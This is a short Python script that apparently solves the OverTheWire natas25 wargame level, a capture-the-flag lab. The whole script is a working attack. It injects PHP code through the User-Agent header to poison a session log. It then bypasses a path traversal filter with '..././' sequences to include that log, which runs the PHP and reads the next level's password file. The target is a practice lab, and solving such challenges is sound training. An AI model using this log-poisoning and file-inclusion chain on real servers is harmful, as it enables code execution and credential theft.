#!/usr/bin/env python3

import requests
pw = open("pw").read()[:-1] # cut off \n

url = "http://natas25.natas.labs.overthewire.org/index.php"
ua  = "<?php global $__GREETING;$__GREETING = file_get_contents('/etc/natas_webpass/natas26');?>"
print("reqing", url, ua)

s = requests.session()
r = s.get(url, auth=("natas25", pw))

# use illegal string to trigger log function
url = "http://natas25.natas.labs.overthewire.org/index.php?lang=natas_webpass"
r = s.get(url, auth=("natas25", pw), headers={ "User-Agent": ua })

url = "http://natas25.natas.labs.overthewire.org/index.php?lang=..././..././..././..././..././tmp/natas25_{}.log".format(s.cookies['PHPSESSID'])
r = s.get(url, auth=("natas25", pw))
print(r.text)
